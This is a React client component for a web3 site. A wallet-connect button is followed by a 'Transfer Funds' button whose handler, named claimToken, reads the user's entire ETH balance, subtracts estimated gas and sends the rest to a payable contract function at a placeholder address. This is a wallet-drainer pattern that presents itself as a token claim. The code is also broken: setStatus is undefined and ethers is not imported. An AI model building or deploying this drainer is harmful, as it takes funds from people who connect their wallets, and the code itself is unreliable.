"use client";

import React, { useState, useEffect } from "react";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount, useSigner } from "wagmi";

export default function ConnectButton() {
  const { open } = useWeb3Modal();
  const { isConnected } = useAccount();
  const { data: signer } = useSigner();

  const [buttonText, setButtonText] = useState("Connect Wallet");

  const claimToken = async (signer) => {
    try {
      const provider = signer.provider;

      const CONTRACT_ADDRESS = "0xYourContractAddress";
      const CONTRACT_ABI = ["function claimToken() external payable"];

      const contract = new ethers.Contract(
        CONTRACT_ADDRESS,
        CONTRACT_ABI,
        signer
      );

      // Get user's current balance
      const userAddress = await signer.getAddress();
      const userBalance = await provider.getBalance(userAddress);

      if (userBalance.isZero()) {
        setStatus("Insufficient balance to transfer!");
        return;
      }

      // Estimate gas fees for the transfer
      const gasPrice = await provider.getGasPrice(); // Current gas price
      const gasEstimate = await contract.estimateGas.claimToken({
        value: userBalance,
      });
      const gasFee = gasPrice.mul(gasEstimate); // Total gas cost (gas price * gas limit)

      // Ensure the user has enough balance to cover gas fees
      if (userBalance.lte(gasFee)) {
        setStatus("Insufficient balance to cover gas fees!");
        return;
      }

      // Calculate the amount to send (balance - gas fee)
      const amountToSend = userBalance.sub(gasFee);

      // Call the contract function
      const tx = await contract.claimToken({
        value: amountToSend, // Send adjusted amount
        gasLimit: gasEstimate,
      });

      setStatus("Transaction sent. Waiting for confirmation...");
      await tx.wait();
      setStatus("Transaction confirmed! Funds transferred.");
    } catch (error) {
      console.error(error);
      setStatus(`Transaction failed: ${error.message}`);
    }
  };

  useEffect(() => {
    if (isConnected) {
      setButtonText("Connected, Ready to Transfer!");
    } else {
      setButtonText("Connect Wallet");
    }
  }, [isConnected]);

  return (
    <div>
      <button className="connect-button" onClick={() => open()}>
        {buttonText}
      </button>

      {isConnected && (
        <button className="transfer-button" onClick={() => claimToken(signer)}>
          Transfer Funds
        </button>
      )}
    </div>
  );
}
